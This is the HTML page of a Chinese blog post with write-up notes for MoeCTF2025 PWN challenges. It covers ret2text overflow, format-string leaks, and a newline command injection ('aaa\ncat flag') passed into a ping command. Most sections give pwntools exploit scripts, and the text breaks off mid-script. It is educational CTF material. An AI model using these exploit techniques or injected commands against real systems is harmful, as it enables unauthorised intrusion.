<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>MoeCTF2025-PWN方向做题笔记 | Icyice's site</title><meta name="author" content="Icyice"><meta name="copyright" content="Icyice"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="MoeCTF2025-PWN方向做题笔记0 二进制漏洞审计入门指北解题思路签到题，脚本都给我们写好了，运行一下就能得flag EXP1234567891011121314151617from pwn import *                                    # 导入 pwntools。context(arch&#x3D;&#x27;amd64&#x27;, os&#x3D;&#x27;l">
<meta property="og:type" content="article">
<meta property="og:title" content="MoeCTF2025-PWN方向做题笔记">
<meta property="og:url" content="http://example.com/2025/10/13/MoeCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Icyice&#39;s site">
<meta property="og:description" content="MoeCTF2025-PWN方向做题笔记0 二进制漏洞审计入门指北解题思路签到题，脚本都给我们写好了，运行一下就能得flag EXP1234567891011121314151617from pwn import *                                    # 导入 pwntools。context(arch&#x3D;&#x27;amd64&#x27;, os&#x3D;&#x27;l">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/OIO.jpg">
<meta property="article:published_time" content="2025-10-12T16:00:00.000Z">
<meta property="article:modified_time" content="2025-10-13T03:53:30.643Z">
<meta property="article:author" content="Icyice">
<meta property="article:tag" content="PWN,CTF,WP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/OIO.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "MoeCTF2025-PWN方向做题笔记",
  "url": "http://example.com/2025/10/13/MoeCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/",
  "image": "http://example.com/img/OIO.jpg",
  "datePublished": "2025-10-12T16:00:00.000Z",
  "dateModified": "2025-10-13T03:53:30.643Z",
  "author": [
    {
      "@type": "Person",
      "name": "Icyice",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="http://example.com/2025/10/13/MoeCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'MoeCTF2025-PWN方向做题笔记',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/OII.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/OIO.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/me.jpg" alt="Logo"><span class="site-name">Icyice's site</span></a><a class="nav-page-title" href="/"><span class="site-name">MoeCTF2025-PWN方向做题笔记</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">MoeCTF2025-PWN方向做题笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-12T16:00:00.000Z" title="发表于 2025-10-13 00:00:00">2025-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-13T03:53:30.643Z" title="更新于 2025-10-13 11:53:30">2025-10-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>35分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="MoeCTF2025-PWN方向做题笔记"><a href="#MoeCTF2025-PWN方向做题笔记" class="headerlink" title="MoeCTF2025-PWN方向做题笔记"></a><strong>MoeCTF2025-PWN方向做题笔记</strong></h1><h2 id="0-二进制漏洞审计入门指北"><a href="#0-二进制漏洞审计入门指北" class="headerlink" title="0 二进制漏洞审计入门指北"></a>0 二进制漏洞审计入门指北</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>签到题，脚本都给我们写好了，运行一下就能得flag</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    <span class="comment"># 导入 pwntools。</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 一些基本的配置。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)             # 在本地运行程序。</span></span><br><span class="line"><span class="comment"># gdb.attach(io)                    # 启动 GDB</span></span><br><span class="line">io = connect(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">51192</span>)              <span class="comment"># 与在线环境交互。</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;114511&#x27;</span>)              <span class="comment"># 什么时候用 send 什么时候用 sendline？</span></span><br><span class="line"></span><br><span class="line">payload  = p32(<span class="number">0xdeadbeef</span>)          <span class="comment"># p32(0xdeadbeef)、b&quot;\xde\xad\xbe\xef&quot;、b&quot;deadbeef&quot; 有什么区别？</span></span><br><span class="line">                                    <span class="comment"># 你看懂原程序这里的检查逻辑了吗？</span></span><br><span class="line">payload += <span class="string">b&#x27;shuijiangui&#x27;</span>           <span class="comment"># strcmp</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password.&#x27;</span>, payload) <span class="comment"># 发送！通过所有的检查。</span></span><br><span class="line"></span><br><span class="line">io.interactive()                    <span class="comment"># 手动接收 flag。</span></span><br></pre></td></tr></table></figure>



<h2 id="EZtext"><a href="#EZtext" class="headerlink" title="EZtext"></a>EZtext</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>Ret2text，题目允许我们设置输入长度，则至少要设置覆盖到栈上得放回地址</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">51978</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">ru(<span class="string">b&quot;Then how many bytes do you need to overflow the stack?&quot;</span>)</span><br><span class="line">sl(<span class="string">b&quot;24&quot;</span>)</span><br><span class="line">shell = <span class="number">0x4011BB</span> <span class="comment">## 错过push rbp，可以避免栈对齐问题</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x10</span>) + p64(shell)</span><br><span class="line">s(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="ez-u64"><a href="#ez-u64" class="headerlink" title="ez_u64"></a>ez_u64</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>利用u64()和recv()，接受并解码即可，最后在发送出去就getshell了</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">51115</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Here is the hint.&quot;</span>)</span><br><span class="line">num = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num).encode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目利用generate()来生成由大小写字母组成得随机字符串，利用%s可以泄露<code>s2_1</code>，利用%p可以泄露<code>s2</code></p>
<p><img src="D:/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/blog/myblog/source/images/Snipaste_2025-08-09_11-55-08.png"></p>
<p>main()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s2_1; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+30h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  s2_1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20u</span>LL);</span><br><span class="line">  generate(s2, <span class="number">5LL</span>);</span><br><span class="line">  generate(s2_1, <span class="number">5LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hey there, little one, what&#x27;s your name?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Nice to meet you,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I buried two treasures on the stack.Can you find them?&quot;</span>);</span><br><span class="line">  fgets(s1, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, s2, <span class="number">5uLL</span>) )</span><br><span class="line">    lose();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yeah,another one?&quot;</span>);</span><br><span class="line">  fgets(s1, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, s2_1, <span class="number">5uLL</span>) )</span><br><span class="line">    lose();</span><br><span class="line">  win();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过gdb调试，借助<code>fmtarg</code>指令来确定参数位置</p>
<p><img src="D:/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/blog/myblog/source/images/Snipaste_2025-08-09_11-59-57.png"></p>
<p>还可以通过计算得到，在 x86-64 中，前 6 个格式化字符串参数通过寄存器传递（rdi, rsi, rdx, rcx, r8, r9），第 7 个开始从栈上读取</p>
<p>在 x86-64 中，printf 的栈参数从 rsp+8 开始（因为 call printf 会将返回地址 rip 压栈，占 8 字节）。</p>
<p><code>s2_1</code>距离<code>rsp</code>有 0x8 个字节，<strong>8个字节为一个参数位</strong>，位于 rsp+8，因此它是 第 7 个参数（因为栈参数从 rsp+8 开始，对应第 7 个）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *s2_1; <span class="comment">// [rsp+8h]</span></span><br></pre></td></tr></table></figure>

<p><code>s2</code>距离<code>rap</code>有0x20个字节 ，也就是 4 个0x8，4 + 6 &#x3D; 10，所以<code>s2</code>是<code>printf</code>的第10个参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+20h]</span></span><br></pre></td></tr></table></figure>

<p><img src="D:/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/blog/myblog/source/images/Snipaste_2025-08-09_12-29-47.png"></p>
<p>得到的<code>s2</code>需要按照小端序解码</p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;192.168.???.??&quot;, 54902)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">hex_val</span>):</span><br><span class="line">    byte_length = (hex_val.bit_length() + <span class="number">7</span>) // <span class="number">8</span>  <span class="comment"># 确保正确计算字节数</span></span><br><span class="line">    bytes_data = hex_val.to_bytes(byte_length, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_data)</span><br><span class="line">    <span class="keyword">return</span> bytes_data</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;name?&quot;</span>, <span class="string">b&quot;-%7$s-%10$p&quot;</span>)</span><br><span class="line">ru(<span class="string">b&quot;-&quot;</span>)</span><br><span class="line">s1 = r(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line">ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">s2 = <span class="built_in">int</span>(r(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(s2))</span><br><span class="line">s2_by = hex_to_bytes(s2)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">b&quot;Can you find them?&quot;</span>, s2_by)</span><br><span class="line">sla(<span class="string">b&quot;Yeah,another one?&quot;</span>, s1)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>ping_host()</code> 对用户输入做了<strong>不完全</strong>的过滤：<code>check()</code> 会拒绝一大堆危险字符（<code>; &amp; | &gt; &lt; $ ( ) &#123; &#125; [ ] &#39; &quot; </code> \ ! ~ *<code>），但**没有禁止换行 </code>\n<code>**（也没有禁止空格、</code>-<code>等），而后面把用户输入放进一个通过</code>system()&#96; 执行的 shell 命令里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_snprintf_chk(command, 32, 1, 32, &quot;ping %s -c 4&quot;, buf);</span><br><span class="line">system(command);</span><br></pre></td></tr></table></figure>

<p>由于 shell 中换行是命令分隔符（相当于 <code>;</code>），如果能把 <code>\n</code> 放进 <code>%s</code>，就可以把 <code>ping …</code> 后分隔出新的任意命令，从而实现命令注入并执行任意命令。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, buf, <span class="number">0xFu</span>LL)` 从 <span class="built_in">stdin</span> 读最多 <span class="number">15</span> 字节到 `buf</span><br></pre></td></tr></table></figure>

<p>之后用 <code>strlen(buf)</code> 得到长度并尝试把末尾的 <code>\n</code> 替换成 <code>\0</code>（那段通过 <code>v2</code> 旁移做 <code>if (*(&amp;v2 + v0) == 10) *(&amp;v2 + v0) = 0;</code>，本意是去掉换行）</p>
<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;192.168.242.1&quot;</span>, <span class="number">58031</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">False</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">sla(<span class="string">b&quot;choice: &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;Enter host to ping:&quot;</span>, <span class="string">b&quot;aaa\ncat flag\n&quot;</span>)  <span class="comment">##第一个回车前不要用一个可以ping通的，执行失败后就会执行第二个回车前的命令</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="randomlock"><a href="#randomlock" class="headerlink" title="randomlock"></a>randomlock</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>这是一道伪随机数的题目，孩子比较笨，逆不出随机数种子seed的生成逻辑，但是可以在gdb里动态调试程序，发现需要输入的10个 <code>password</code>依次为 9383、886、2777、6915、7793、8335、5386、492、6649、1421</p>
<p>位置在<code>0x555555555562 &lt;main+152&gt;    mov    dword ptr [rbp - 0xc], eax</code>此处可以发现password的值</p>
<p>以下是其中一个例子：password10</p>
<p><img src="/./../images/Snipaste_2025-08-10_00-20-57.png"></p>
<h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">51713</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span 